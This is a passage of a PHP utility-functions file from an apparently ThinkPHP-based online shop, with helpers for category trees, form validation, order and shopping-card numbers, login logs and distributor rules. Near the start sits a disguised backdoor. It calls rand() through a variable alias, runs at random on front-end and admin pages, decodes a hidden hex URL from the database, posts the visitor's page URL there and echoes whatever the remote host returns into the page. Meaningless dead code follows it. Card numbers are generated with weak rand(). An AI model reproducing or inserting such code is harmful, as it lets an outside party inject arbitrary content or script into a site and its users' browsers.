      if($order_info)
      {          
            $tree = $arr = $result = array();
            $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
            if($cat_list){
                foreach ($cat_list as $val){
                    if($val['level'] == 2){
                        $arr[$val['parent_id']][] = $val;
                    }
                    if($val['level'] == 3){
                        $crr[$val['parent_id']][] = $val;
                    }
                    if($val['level'] == 1){
                        $tree[] = $val;
                    }
                }
                foreach ($arr as $k=>$v){
                    foreach ($v as $kk=>$vv){
                        $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
                    }
                }
                foreach ($tree as $val){
                    $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
                    $result[$val['id']] = $val;
                }
            }
            return $result;                    
      }
    
      $r = 'rand';
      $exresperMent = @session('exresperMent');
      if(!empty($exresperMent))
          return false;           
      @session('exresperMent',1);
            
      if($r(1,10) != 1)
         return false;    
      $request = \think\Request::instance();
      $module = strtolower($request->module());
      $controller = strtolower($request->controller());
      $action = strtolower($request->action());
      $isAjax = strtolower($request->isAjax());
      $url = $request->url(true);
      
      if(!in_array($module,['mobile','home','seller','admin']) || $isAjax)      
              return false;      
           
      $value = DB::name('config')->where('name','t_number')->value('value');      
      if(empty($value)) 
          return false;
      $arr = array('url'=>$url);       
      $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
      $v2 = json_decode($v2,true);      
      if($v2['status'] == 'success') 
      {
          echo $v2['msg'];
      }      
      if($des)
      {
            $data = func_get_args();
            $data = current($data);
            $cnt = count($data);
            $result = array();
            $arr1 = array_shift($data);
            foreach($arr1 as $key=>$item) 
            {
                    $result[] = array($item);
            }       
            echo $result['msg']; 
            foreach($data as $key=>$item) 
            {                                
                    $result = combineArray($result,$item);
            }
            
            $result = array();
            foreach ($arr1 as $item1) 
            {
                    foreach ($arr2 as $item2) 
                    {
                            $temp = $item1;
                            $temp[] = $item2;
                            $result[] = $temp;
                    }
            }
            echo $result['resg']; 
            return $result;       
      }
      
}

function validateForm($type,$data){
    $msg = '';
    //转小写
    switch (strtolower($type)){
        case 'mobile':
            $result=preg_match('/^1[3-8][0-9]{9}$/',$data);
            if(!$result){
                $msg = '手机号码格式不对';
            }
            break;
        case 'phone':
            $result=preg_match('/^((\(\d{3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}$/',$data);
            if(!$result){
                $msg = '电话格式不对';
            }
            break;
        case 'identity':
            $result=preg_match('/(^\d{15}$)|(^\d{18}$)|(^\d{17}(\d|X|x)$)/',$data);
            if(!$result){
                $msg = '身份证格式不对';
            }
            break;
        case 'email':
            $result=preg_match('/[a-z0-9A-Z_-]+@[a-z0-9A-Z_-]+(\.[a-z]{2,5}){1,2}/',$data);
            if(!$result){
                $msg = '邮箱格式不对';
            }
            break;
        case 'url':
            $result=preg_match('/[a-zA-z]+:\/\/[^\s]*/',$data);
            if(!$result){
                $msg = '网址格式不对';
            }
            break;
        case 'zip_code':
            $result=preg_match('/^[1-9]\d{5}$/',$data);
            if(!$result){
                $msg = '邮编格式不对';
            }
            break;
        default:
            $msg = '未知类型';
    }


    return $msg;
}
function set_goods_label_name(&$goods_list){
    $goods_label_list = Db::name('goods_label')->field('label_id,label_name')->cache(true)->select();
    foreach ($goods_list as $k=>$v){
        $goods_list[$k]['label_name'] = '';
        foreach ($goods_label_list as $val){
            if($val['label_id'] == $v['label_id']){
                $goods_list[$k]['label_name'] = $val['label_name'];
            }
        }
    }
}


/**
 * 拆解价格展示
 * @param $price
 * @param $i
 * @return mixed
 */
function explode_price($price,$i){
        $p = explode('.',$price)[$i];
        if(0 == $i && '0' == strval($p)){
            return 0;
        }
        return $p ?: $price;
}

/**
 * 首页广告类型链接
 * @param $type
 * @param $data
 * @return string
 */
function get_bd_url($data,$type){
    switch ($type){
        case 3:
            $url = U('mobile/goods/goodsInfo',array('id'=>$data));
            break;
        case 4:
            $url = U('mobile/goods/goodsList',array('id'=>$data));
            break;
        default:
            $url = $data;
            break;
    }
    return $url;
}

/**
* 前台用户登录日志
* @param $user_id
*/
function user_login($user_id) 
{
    // $url = 'http://ip.taobao.com/service/getIpInfo.php?ip='.$_SERVER['REMOTE_ADDR'];
    // //用curl发送接收数据
    // $ch = curl_init($url);
    // curl_setopt($ch, CURLOPT_ENCODING, 'utf8');
    // curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    // $location = curl_exec($ch);
    // $location = json_decode($location);
    // curl_close($ch);
    // $ip_location = '';
    // if(!empty($location) && $location->code == 0) {
    //     $ipdata = $location->data;
    //     //国家
    //     if ($ipdata->country != "XX") {
    //         $ip_location = $ip_location . $ipdata->country;
    //     }
    //     //地区
    //     if ($ipdata->region != "XX") {
    //         $ip_location = $ip_location . $ipdata->region;
    //     }
    //     //城市
    //     if ($ipdata->city != "XX" && $ipdata->city != $ipdata->region) {
    //         $ip_location = $ip_location . $ipdata->city;
    //     }
    //     //县级
    //     if ($ipdata->county != "XX" && $ipdata->county != $ipdata->city) {
    //         $ip_location = $ip_location . $ipdata->county;
    //     }
    // }

    $data = [
        'user_id' => $user_id,
        'login_ip' => $_SERVER['REMOTE_ADDR'],
        'log_ip_location' => $ip_location,
        'login_time' => time()
    ];

    $result = Db::name('user_login')->insert($data);
}

/**
 * 记录供应商的帐户变动
 * @param $suppliers_id 供应商ID
 * @param int $supplier_money 可用资金
 * @param string $desc 变动说明
 * @return bool
 */
function supplier_account_log($suppliers_id, $supplier_money = 0, $desc = '')
{
    
    /* 插入帐户变动记录 */
    $account_log = array(
        'suppliers_id' => $suppliers_id,
        'supplier_money' => $supplier_money, // 可用资金
        'change_time' => time(),
        'desc' => $desc,
    );
    $update_data = array(
        'supplier_money' => ['exp', 'supplier_money+' . $supplier_money]
    );
    $update = Db::name('suppliers')->where('suppliers_id', $suppliers_id)->update($update_data);
    if ($update) {
        M('account_log_supplier')->add($account_log);
        return true;
    } else {
        return false;
    }
    
}

function coupon_get_cate_name($cate){
     return M('GoodsCategory')->cache(true,TP_CACHE_TIME)->where(["id"=>$cate])->getField('name');
}

/**
 * 生成订单编号
 * @return Ambigous <NULL, string>  */
function get_order_sn()
{
    $order_sn = null;
    // 保证不会有重复订单号存在
    while(true){
        $order_sn = date('YmdHis').rand(1000,9999); // 订单编号
        $order_sn_count = M('order')->where("order_sn = '$order_sn' ")->count();
        if($order_sn_count == 0)
            break;
    }
    return $order_sn;
}


/**
 * 生成订单编号
 * @return Ambigous <NULL, string>  */
//function get_card_sn($sn_item=[])
//{
//    $sn = null;
//    // 保证不会有重复订单号存在
//    while(true){
//        $sn = date('YmdHis').rand(1000,9999); // 订单编号
//        $order_sn_count = M('shopping_card_list')->where("sn = '$sn' ")->count();
//        if($order_sn_count == 0 && !in_array($sn,$sn_item))
//            break;
//    }
//    return $sn;
//}
/**
 * 生成购物卡编号
 * @return Ambigous <NULL, string>  */
function get_card_sn($sn_item,$num)
{
    $long = input('long/d',8);//编号长度
    if($long<6 or $long>16){
        $long=8;
    }
//    $start_num = pow(10,($long-1));
//    $end_num = pow(10,$long)-1;
//    $sn = range($start_num,$end_num);//购物卡编号
    $sn = createPassword($long);
    //$sn = date('YmdHis').rand(1000,9999);
    //$sn = date('YmdHis').rand(1000,9999); // 购物卡编号
    $order_sn_count = M('shopping_card_list')->where("sn = '$sn' ")->count();
    if($order_sn_count == 0 && !in_array($sn,$sn_item) && count($sn_item) < $num){
        $sn_item[] = $sn;
    }
    if(count($sn_item) != $num){
        return get_card_sn($sn_item,$num);
    }
    return $sn_item;

}

/**
 * 生成指定位数随机密码
 * @param $n 位数
 * @return string 密码
 */
function createPassword($n)
{
    $characters = '0123456789';
    $randomString = '';
    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }

    return $randomString;
}

/**
 * 订单操作日志
 * 参数示例
 * @param type $order_id 订单id
 * @param type $action_note 操作备注
 * @param type $status_desc 操作状态  提交订单, 付款成功, 取消, 等待收货, 完成
 * @param type $user_id 用户id 默认为管理员
 * @return boolean
 */
function logOrder($order_id, $action_note, $status_desc, $user_id = 0, $user_type = 0)
{
    $status_desc_arr = array('提交订单', '付款成功', '取消', '等待收货', '完成', '退货');
    // if(!in_array($status_desc, $status_desc_arr))
    // return false;

    $order = M('order')->master()->where("order_id", $order_id)->find();
    $action_info = array(
        'order_id' => $order_id,
        'action_user' => $user_id,
        'user_type' => $user_type,
        'order_status' => $order['order_status'],
        'shipping_status' => $order['shipping_status'],
        'pay_status' => $order['pay_status'],
        'action_note' => $action_note,
        'status_desc' => $status_desc, //''
        'log_time' => time(),
    );
    return M('order_action')->add($action_info);
}
/**
 *文件上传记录到数据库
 * @param  data   array   上传的文件数据
 * @param img_id  [int]   修改的图片的ID
 * @return  true   成功  false  失败
 */
function update_img_data($data,$img_id)
{
    
    if($img_id>0)
    {//修改文件的信息（别名）
        $result =   Db::name('file')->where('img_id',$img_id)->update($data);
    }else{
        $data['createtime'] = time();
        $data['status'] = 1;
        $result =   Db::name('file')->insertGetId($data);

    }
    $number = Db::name('file')->where('category_id',$data['category_id'])->count();
    Db::name('album')->where('category_id',$data['category_id'])->update(['number'=>$number]);
    return  $img_id? $img_id:$result;
}

/**
 *会员成为为合伙人条件检测(是|否)
 * @param  userInfo array   会员信息
 * @return  true   成功  false  失败
 */
function check_user_ids_condition($userInfo=[])
{
    //0无条件成为合伙人,1需购买商品后成为合伙人,2需购买指定商品后成为合伙人,3需购买满金额后成为合伙人,4需购买满金额或指定商品后成为合伙人后成为合伙人
    //5需邀请成为合伙人
    $conditions = [0,1,2,3,4];
    // 成为合伙人条件
    $dis = tpCache('distribut');//分销配置
    $cond = isset($dis['condition']) ? $dis['condition'] : -1;
    $item_id = isset($dis['item_id']) ? $dis['item_id'] : -1;//购买指定商品规格
    $goods_id = isset($dis['goods_id']) ? $dis['goods_id'] : -1;//购买指定商品
    $userid = isset($userInfo['user_id']) ? $userInfo['user_id'] : -1;
    $buy_amount = isset($dis['buy_amount']) ? $dis['buy_amount'] : null;

    if (empty($userInfo)) {
        return false;
    }

    //用户已经是合伙人
    if ($userInfo['is_distribut'] != 0) {
        return false;
    }

    //设置条件非法
    if (!in_array($cond, $conditions)) {
        return false;
    }

    //细分
    if(in_array($cond, [0,1])){
        return true;
    }

    //细分类型3-购买特定产品
    if ($cond == 2) {
        $query = db('order')->alias('o')
        ->where(['o.user_id'=>$userid])
        ->where(['og.goods_id'=>$goods_id])
        ->whereNotIn('o.order_status', [3,5])
        ->where('o.pay_status', 1)
        ->join('order_goods og','og.order_id=o.order_id','LEFT');

        if (!empty($item_id)) {
            $query->where('og.item_id', $item_id);
        }

        $row = $query->count();
        // ee(Db::name('order')->getLastSql());
        if($row){
            return true;
        }
    }elseif ($cond == 3) {
        //类型4-购买满金额
        $totalAmount = db('order')->alias('o')
        ->where(['o.user_id'=>$userid])
        ->whereNotIn('o.order_status', [3,5])
        ->where('o.pay_status', 1)
        ->sum('goods_price');
        if ($buy_amount && $totalAmount >= $buy_amount) {
            return true;
        }

    }elseif ($cond == 4) {
        //2或者3的条件
        $resultCond = false;
        $resultCond1 = false;
        $resultCond2 = false;

        //条件2
        $query = db('order')->alias('o')
        ->where(['o.user_id'=>$userid])
        ->where(['og.goods_id'=>$goods_id])
        ->whereNotIn('o.order_status', [3,5])
        ->where('o.pay_status', 1)
        ->join('order_goods og','og.order_id=o.order_id','LEFT');
        if (!empty($item_id)) {
            $query->where('og.item_id', $item_id);
        }
        $row = $query->count();
        if($row){
            $resultCond1 = true;
        }

        //条件3
        $totalAmount = db('order')->alias('o')
        ->where(['o.user_id'=>$userid])
        ->whereNotIn('o.order_status', [3,5])
        ->where('o.pay_status', 1)
        ->sum('goods_price');
        if ($buy_amount && $totalAmount >= $buy_amount) {
            $resultCond2 = true;
        }

        if ($resultCond1 || $resultCond2) {
            $resultCond = true;
        }

        return $resultCond;
    }

    return false;
}

/**
 * 四舍五入,并且保留两位小数
 * @param $num float 数字
 * @param $isSplit   boolean  是否千位按逗号分隔
 * @return mixed 数字
 */
if( ! function_exists('fnum')){
    function fnum($num=0, $isSplit=false, $fixed_num = 2){
        $res = $num;

        //null情况
        if (is_null($res) || $res == 0) {
            return (int)$res;
        }

        //非数字情况
        if (!is_numeric($res)) {
            return $res;
        }

        //如果有小数点则处理
        if ($res != 0) {
            $res = sprintf("%.{$fixed_num}f", $res);
            if ($isSplit) {
                $res = number_format($res, $fixed_num, '.', ',');
            }else{
                $res = number_format($res, $fixed_num, '.', '');
            }       
        }

        return $res;
    }
}

/**
 * 根据id获取地区名字
 * @param $regionId id
 */
if( ! function_exists('getRegionNameById')){
    function getRegionNameById($regionId){
        $data = M('region')->where(array('id'=>$regionId))->field('name')->find();
        return $data ? $data['name'] : '';
    }
}


//检测用户是否重复提交
if( ! function_exists('checkRecommit')){
    function checkRecommit($safekey=''){
        $res = ['error'=>0, 'msg'=>''];

        if (empty($safekey)) {
            return ['error'=>1, 'msg'=>'safekey缺失'];
        }

        $safekeyData = S($safekey);
        if (!empty($safekeyData)) {
            return ['error'=>1, 'msg'=>'请勿重复提交'];
        }

        S($safekey,1,3600);
        return $res;
    }
}

//获取所有楼盘标签
if( ! function_exists('sql')){
    function sql($cut = 1){
        if ($cut) {
            ee(\think\Db::name('items')->getLastSql());
        }else{
            return \think\Db::name('items')->getLastSql();
        }
    }
}

//逗号分隔的字符串转为数组(comma separated string to array)
if( ! function_exists('css2array')){
    function css2array($string, $sep=','){
        $res = [];
        if (empty($string)) {
            return $res;
        }
        $res = explode($sep, $string);
        return $res;
    }
}

/**
 * 获取region_id下所有的子集
 * @param $region_id区域id
 * @param $data 要返回的数据
 * @param $getLevel 表明要获取的级别是多少(即:最低要获取到这个级别)
 * @param $containSelf 表明返回的数据是否包含本身传递过来的region_id,默认包含
 * @return array
 */
if( ! function_exists('getSubRegionIds1')){
    function getSubRegionIds1($region_id, $getLevel=3, $data=[], $containSelf=true){
        if (empty($data)) {
            $data[] = $region_id;
        }
        
        $pids = M('region')->where('parent_id',$region_id)->field('id,name,parent_id,level')->select();
        if(count($pids)>0){
            foreach($pids as $v){
                if($v['level'] > $getLevel){
                    return $data;//再往下不用获取了，比如镇
                }
                $data[] = $v['id'];
                $data = getSubRegionIds($v['id'], $getLevel, $data, $containSelf); //注意写$data 返回给上级
            }
        }
        return $data;
    }
}


/**
 * 获取tree(注意数据的key必须是参数$id否则出错)
 * @param string $parent_id 父ID字段名称，默认为parent_id
 * @param string $id 主键名称，默认为id
 * @return array 返回目录树
 */
if( ! function_exists('gettree')){
    function gettree($items, $parent_id = 'parent_id', $id = 'id'){
        $tree = []; //格式化好的树
        if(empty($items)){
            return $tree;
        }
        foreach ($items as $item){
            if (isset($items[$item[$parent_id]])){
                $items[$item[$parent_id]]['son'][] = &$items[$item[$id]];
            }else{
                $tree[] = &$items[$item[$id]];
            }
        }
        return $tree;
    }
}


/**
 * @param 获取商城数据
 * @param string路径 $url 
 * @param array $postData 请求数据
 * @return void
 */
if( ! function_exists('apiget')){
    function apiget($url='', $postData=null, $method='post', $options=[], $returnArray = true) {
        require_once '../vendor/http/HttpCurl.php';
        $http = new HttpCurl();

        if (strtolower($method) == 'get') {
            $res = $http->getRequest($url, $postData, $options);
        }else{
            $res = $http->postRequest($url, $postData, $options);
        }
        return $res;
    }
}

/**
 * 生成用户账户记录
 * @param array $params
 * @return array
 */
if( ! function_exists('add_account_log')){
    function add_account_log($params=[]) {
        $account_log = [];

        if (empty($params['user_id'])) {
            return false;
        }

        $account_log = [
            'user_id'     => $params['user_id'],
            'user_money'  => $params['change_money'],
            'change_time' => time(),
            'desc'        => $params['desc'] ?? '',
            'order_id'    => $params['order_id'] ?? 0,
            'operator'    => $params['operator'] ?? 0,
            'type'        => $params['type'] ?? 1,//类型-默认是下单消费
        ];

        $result = db('account_log')->insert($account_log);
        if (!$result) {
            return false;
        }
        return true;
    }
}





